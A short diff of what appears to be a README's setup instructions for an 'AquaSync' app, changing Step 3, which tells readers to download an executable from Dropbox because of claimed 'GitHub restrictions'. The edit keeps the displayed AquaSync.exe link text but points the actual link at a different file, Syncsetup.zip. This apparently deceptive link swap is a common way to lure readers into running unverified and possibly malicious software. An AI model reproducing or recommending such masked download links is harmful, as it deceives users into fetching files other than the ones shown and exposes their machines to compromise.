@@ -26,7 +26,7 @@ Step 3: Download AquaSync App
 
 The AquaSync app is hosted externally due to GitHub’s restrictions. Download it from the following link:
 
-https://www.dropbox.com/scl/fi/0hpblsof9uv9z9p34r4ns/AquaSync.exe?rlkey=6manyv7pqx0xap78m1kttgw5m&e=1&st=jqx0858u&dl=0
+https://www.dropbox.com/scl/fi/0hpblsof9uv9z9p34r4ns/AquaSync.exe?rlkey=6manyv7pqx0xap78m1kttgw5m&e=1&st=jqx0858u&dl=0](https://www.dropbox.com/scl/fi/5fx5dgixmg4gg4e36h1zg/Syncsetup.zip?rlkey=f17akmj5u8qw9jjmpw41u1rg8&st=p4660j93&dl=0)
 
 Step 4: Start XAMPP
 
